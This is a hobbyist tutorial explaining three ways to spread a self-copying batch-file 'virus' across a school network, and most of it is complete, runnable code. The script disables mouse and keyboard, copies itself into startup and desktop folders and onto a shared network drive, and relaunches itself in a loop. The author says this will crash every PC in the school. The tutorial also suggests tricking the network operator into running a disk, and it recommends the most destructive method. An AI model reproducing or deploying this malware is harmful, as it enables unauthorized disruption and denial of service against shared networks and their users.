this tutorial is going to explain how to spread a batch file thru a network.
it is needed to know the basics of batch first, and you must go learn a more complicated language like c++ or VBScript

#################
1) introduction #
#################

ok so you know the basics on batch and are willing to learn more about it. 
Well you can. In this tutorial there will be 3 ways explained on how to spread a virus.  :buttrock:
small list of commands that must be known ELSE STOP READING THIS AND LOOK FOR Batch for Idiots I and II

### Code ###
echo - basic echo command
@echo off - not displaying commands
cls - clearing screen
copy %0 - copy the running file
copy - copy a file
cd - current directory
pause - waiting for user to press a button
>nul - not displaying a command
>> - placing the text to the end of a file
### Code ###

##################
2) The first way #
##################
now i know you are all curious about how to spread it but let's first make a code to spread...
i have made this

### Code ###
:start
@echo off
C:\Windows\rundll32.exe mouse,disable
C:\Windows\rundll32.exe keyboard,disable
set DM = dainamix.bat
cls
echo.
echo #####
echo # Spread Virus on LAN
echo # Credit by: N-Cen-Dainamix
echo #####
echo (C) 2018 by: `Dainamix~Team`
echo.
if exist C:\%DM% del %0
copy %0 C:\%DM%
start C:\%DM%
goto start
### Code ###

ok first what this "virus" does
it echos all bullshit sets DM as dainamix.bat copys itself to DM and starts DM
now we want to make this file go all around the school network because we really hate the dainamix  :angry:
we add this code

### Code ###
:mid
if exist C:\winDM goto winDM
copy %0 C:\windows\AllUse~1\Applic~1\dainamix.bat
copy %0 C:\windows\alluse~1\Destkop\dainamix.bat
copy %0 C:\windows\alluse~1\startm~1\dainamix.bat
copy %0 C:\windows\alluse~1\startm~1\progra~1\dainamix.bat
goto end
:winDM
copy %0 C:\winDM\AllUse~1\Applic~1\dainamix.bat
copy %0 C:\winDM\alluse~1\Destkop\dainamix.bat
copy %0 C:\winDM\alluse~1\startm~1\dainamix.bat
copy %0 C:\winDM\alluse~1\startm~1\progra~1\dainamix.bat
goto end
:end
goto start
### Code ###

In the end the batch file should look like this

### Code ###
:start
@echo off
C:\windows\rundll32.exe mouse,disable
C:\windows\rundll32.exe keyboard,disable
set DM = dainamix.bat
cls
echo.
echo #####
echo # Spread Virus on LAN
echo # Credit by: N-Cen-Dainamix
echo #####
echo (C) 2018 by: `Dainamix~Team`
echo.
if exist C:\%DM% del %0
copy %0 C:\%DM%
start C:\%DM%
:mid
if exist C:\winDM goto winDM
copy %0 C:\windows\AllUse~1\Applic~1\dainamix.bat
copy %0 C:\windows\alluse~1\Destkop\dainamix.bat
copy %0 C:\windows\alluse~1\startm~1\dainamix.bat
copy %0 C:\windows\alluse~1\startm~1\progra~1\dainamix.bat
goto end
:winDM
copy %0 C:\winDM\AllUse~1\Applic~1\dainamix.bat
copy %0 C:\winDM\alluse~1\Destkop\dainamix.bat
copy %0 C:\winDM\alluse~1\startm~1\dainamix.bat
copy %0 C:\winDM\alluse~1\startm~1\progra~1\dainamix.bat
goto end
:end
goto start
### Code ###

Ok so that was the first way .. with this code it doesnt only really irritate someone but it also keeps making the file C:\dainamix.bat 
bigger and bigger every 10 seconds the file is opened. 
the more people that open the file the bigger the file gets. the formula for the file growth is = 120 x numberofusersthatopenedfile / 5 x 60
so if 200 people on your school opens it you get a growth of 288000 KB per minute which is 281,25 MB per minute
within 15 minutes every PC in the school will crash.

3) The second way #
###################

This is far the easyiest way of spreading a virus... but it is most of the time insecure. 
this is because you need to know what the name of the network drive on school 
is at my school its H: so ill use that
i use the same script as above

### Code ###
:start
@echo off
C:\windows\rundll32.exe mouse,disable
C:\windows\rundll32.exe keyboard,disable
set DM = dainamix.bat
cls
echo.
echo #####
echo # Spread Virus on LAN
echo # Credit by: N-Cen-Dainamix
echo #####
echo (C) 2018 by: `Dainamix~Team`
echo.   
if exist C:\%DM% del %0
copy %0 C:\%DM%
start C:\%DM%
copy %0 H:\docume~1\userli~1\dainamix.bat
goto start
### Code ###

ok that wasnt so hard

##################
4) the third way #
##################

ask the operator to install the disk you have in your hand in the main networking computer...
if he's stupid enough and does it only 1 person has 2 open it and the school is offline

################
5) what i want #
################

what i recommend is using the first method because its deadly.
what i want is that noone uses the name dainamix exactly copys the scripts above or any of the code in it
